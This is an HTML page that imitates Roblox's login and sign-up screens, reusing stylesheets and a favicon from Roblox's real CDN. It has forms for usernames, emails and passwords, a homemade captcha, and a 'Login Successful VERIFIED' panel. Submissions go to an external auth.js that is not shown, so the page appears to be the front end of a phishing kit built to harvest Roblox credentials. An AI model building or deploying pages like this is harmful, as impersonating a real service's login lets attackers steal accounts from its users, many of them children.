<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Log in to Roblox</title>
    <link href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico" rel="icon">
    <link rel="stylesheet"
        href="https://css.rbxcdn.com/56f6868ec13cefb471ad86176c7b9642571d05082c86ac6300ddfeb028617d4e.css">
    <link rel="stylesheet"
        href="https://css.rbxcdn.com/cfd5a413ec221b8b28b5fb9ba4204c0b77b5548e78a608e3da01c928e7117a24-ReactStyleGuide.css">
    <link rel="stylesheet"
        href="https://css.rbxcdn.com/91916339a0d1695e194977e5770a69e5793455887fc79df2e847290247c6e504-StyleGuide.css">
    <link rel="stylesheet"
        href="https://css.rbxcdn.com/ef552f4ac70dd3209c70b94a377f66e3828905b9672bb67c661122403a6d15b7-Builder.css">
    <link rel="stylesheet"
        href="https://css.rbxcdn.com/d7d4183c8033d692e0ca8ad5222b943fe27879f9a771c9bd98165ccc4e270d7b-Thumbnails.css">
    <link rel="stylesheet"
        href="https://css.rbxcdn.com/a8efbd5b60532eae08e9989cc5eeb501b5023ce351aac7c0d59eba839aaaa6b9-Navigation.css">
    <link rel="stylesheet"
        href="https://css.rbxcdn.com/9614df97076ece81a878442b453b2614a3c683cb83cde0b50a71ad6ac65051b8-Footer.css">
    <link rel="stylesheet"
        href="https://css.rbxcdn.com/0833fd982a249c0efd187f4f65757b1ebec3ab56ffe67c88c306d07be90d0974-ReactLogin.css">
    <style>
        html,
        body {
            margin: 0;
            height: 100%;
            overflow: hidden !important;
        }

        .marketing-background-1 {
            background-size: cover !important;
            background-position: center !important;
            background-repeat: no-repeat !important;
            height: 100vh;
            width: 100vw;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-section {
            max-width: 400px !important;
            width: 100%;
            margin-top: 60px;
        }

        .status-msg {
            padding: 12px;
            border-radius: 4px;
            margin: 15px 0;
            font-size: 13px;
            display: none;
        }

        .status-msg.show {
            display: block;
        }

        .status-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .status-error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .result-box {
            background: #f5f5f5;
            padding: 15px;
            border-radius: 4px;
            border-left: 4px solid #0084ff;
            margin: 15px 0;
            display: none;
            font-size: 13px;
        }

        .result-box.show {
            display: block;
        }

        .form-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            border-bottom: 2px solid #e0e0e0;
            padding-bottom: 10px;
        }

        .form-tab-btn {
            padding: 8px 12px;
            background: none;
            border: none;
            cursor: pointer;
            font-size: 13px;
            font-weight: 600;
            color: #999;
            transition: all 0.3s;
        }

        .form-tab-btn.active {
            color: #0084ff;
            border-bottom: 3px solid #0084ff;
            margin-bottom: -13px;
        }

        .form-section {
            display: none;
        }

        .form-section.active {
            display: block;
        }

        .spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #0084ff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .verified-badge {
            background: #28a745;
            color: white;
            padding: 3px 8px;
            border-radius: 3px;
            font-size: 11px;
            font-weight: 600;
            margin-left: 8px;
        }
    </style>
</head>

<body id="rbx-body" dir="ltr" class="rbx-body dark-theme builder-font">
    <div id="wrap" class="wrap no-gutter-ads logged-out">
        <div id="navigation-container" class="builder-font">
            <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
                <div class="container-fluid">
                    <div class="rbx-navbar-header">
                        <div class="navbar-header">
                            <a class="navbar-brand" href="#">
                                <span class="icon-logo"></span><span class="icon-logo-r"></span> </a>
                        </div>
                    </div>
                    <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
                        <li><a class="font-header-2 nav-menu-title text-header" href="#">Charts</a></li>
                        <li><a class="font-header-2 nav-menu-title text-header" href="#">Marketplace</a></li>
                        <li><a class="font-header-2 nav-menu-title text-header" href="#">Create</a></li>
                        <li><a class="font-header-2 nav-menu-title text-header" href="#">Robux</a></li>
                    </ul>
                    <div id="right-navigation-header">
                        <div class="navbar-right rbx-navbar-right">
                            <ul class="nav navbar-right rbx-navbar-right-nav">
                                <li class="signup-button-container"><a
                                        class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="#"
                                        onclick="switchTab('register')">Sign Up</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <main class="container-main content-no-ads" id="container-main" tabindex="-1">
            <div class="content" id="content">
                <div id="react-login-web-app" class="login-container" style="max-width: 100%;">
                    <div id="background-image" class="background-image marketing-background-1">
                        <div class="login-base-container" id="login-base"
                            style="width: 100%; display: flex; justify-content: center;">
                            <div class="section-content login-section">
                                <div class="form-tabs">
                                    <button class="form-tab-btn active" onclick="switchTab('login')">Login</button>
                                    <button class="form-tab-btn" onclick="switchTab('register')">Sign Up</button>
                                </div>

                                <!-- LOGIN FORM -->
                                <div id="login" class="form-section active">
                                    <h1 class="login-header">Login to Roblox</h1>
                                    <form class="login-form" onsubmit="return handleLogin(event)">
                                        <div class="form-group username-form-group">
                                            <input id="login-username" name="username" type="text" class="form-control input-field" placeholder="Username/Email/Phone" required>
                                        </div>
                                        <div class="form-group password-form-group">
                                            <input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Password" required>
                                        </div>
                                        <div style="background: #f9f9f9; padding: 12px; border-radius: 4px; margin: 15px 0; border: 1px solid #ddd;">
                                            <div style="font-size: 13px; margin-bottom: 8px;">Captcha: <strong id="login-captcha-prompt">-</strong></div>
                                            <div style="display: flex; gap: 8px; align-items: center;">
                                                <input type="text" id="login-captcha-answer" class="form-control input-field" placeholder="Answer" style="max-width: 120px;">
                                                <button type="button" id="login-captcha-verify" class="btn-control-sm">Verify</button>
                                                <button type="button" id="login-captcha-refresh" class="btn-control-sm">Refresh</button>
                                            </div>
                                            <div id="login-captcha-status" class="status-msg"></div>
                                        </div>
                                        <button type="submit" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button>
                                    </form>
                                    <div id="loginStatus" class="status-msg"></div>
                                    <div id="userProfile" class="result-box">
                                        <div style="margin-bottom: 10px;"><strong>✓ Login Successful</strong>
                                            <span class="verified-badge">VERIFIED</span></div>
                                        <p style="margin: 5px 0;">Username: <strong id="profileUsername">-</strong></p>
                                        <p style="margin: 5px 0;">User ID: <strong id="profileId">-</strong></p>
                                        <p style="margin: 5px 0;">Roblox ID: <strong id="profileRobloxId">-</strong></p>
                                    </div>
                                    <div class="text-center forgot-credentials-link" style="margin: 20px 0;">
                                        <a id="forgot-credentials-link" class="text-link" href="#">Forgot Password or
                                            Username?</a>
                                    </div>
                                    <div
                                        style="text-align: center; margin: 20px 0; border-bottom: 1px solid #ddd; padding: 10px 0;">
                                        OR</div>
                                    <button type="button" class="btn-full-width btn-control-md" style="background: #f0f0f0; color: #000; border: 1px solid #ddd; margin: 10px 0;">Email Me a One-Time Code</button>
                                    <button type="button" class="btn-full-width btn-control-md" style="background: #f0f0f0; color: #000; border: 1px solid #ddd; margin: 10px 0;">Quick Sign-in</button>
                                    <div class="text-center" style="margin-top: 20px;">
                                        <div class="signup-option">
                                            <span class="no-account-text">Don't have an account?</span>
                                            <a class="text-link signup-link" href="#"
                                                onclick="switchTab('register')">Sign Up</a>
                                        </div>
                                    </div>
                                </div>

                                <!-- REGISTER FORM -->
                                <div id="register" class="form-section">
                                    <h1 class="login-header">Create Account</h1>
                                    <form class="login-form" onsubmit="return handleRegister(event)">
                                        <div class="form-group username-form-group">
                                            <input id="register-username" name="username" type="text" class="form-control input-field" placeholder="Username" required>
                                            <small id="username-check" style="font-size: 11px; color: #999;"></small>
                                        </div>
                                        <div class="form-group username-form-group">
                                            <input id="register-email" name="email" type="email" class="form-control input-field" placeholder="Email Address" required>
                                        </div>
                                        <div class="form-group password-form-group">
                                            <input id="register-password" name="password" type="password" class="form-control input-field" placeholder="Password" required>
                                        </div>
                                        <div class="form-group password-form-group">
                                            <input id="register-password-confirm" name="password-confirm" type="password" class="form-control input-field" placeholder="Confirm Password" required>
                                        </div>
                                        <div style="background: #f9f9f9; padding: 12px; border-radius: 4px; margin: 15px 0; border: 1px solid #ddd;">
                                            <div style="font-size: 13px; margin-bottom: 8px;">Captcha: <strong id="register-captcha-prompt">-</strong></div>
                                            <div style="display: flex; gap: 8px; align-items: center;">
                                                <input type="text" id="register-captcha-answer" class="form-control input-field" placeholder="Answer" style="max-width: 120px;">
                                                <button type="button" id="register-captcha-verify" class="btn-control-sm">Verify</button>
                                                <button type="button" id="register-captcha-refresh" class="btn-control-sm">Refresh</button>
                                            </div>
                                            <div id="register-captcha-status" class="status-msg"></div>
                                        </div>
                                        <button type="submit" id="register-button" class="btn-full-width login-button btn-secondary-md">Create Account</button>
                                    </form>
                                    <div id="registerStatus" class="status-msg"></div>
                                    <div class="text-center" style="margin-top: 20px;">
                                        <div class="signup-option">
                                            <span class="no-account-text">Already have an account?</span>
                                            <a class="text-link signup-link" href="#" onclick="switchTab('login')">Log
                                                In</a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <script src="auth.js"></script>
</body>

</html>
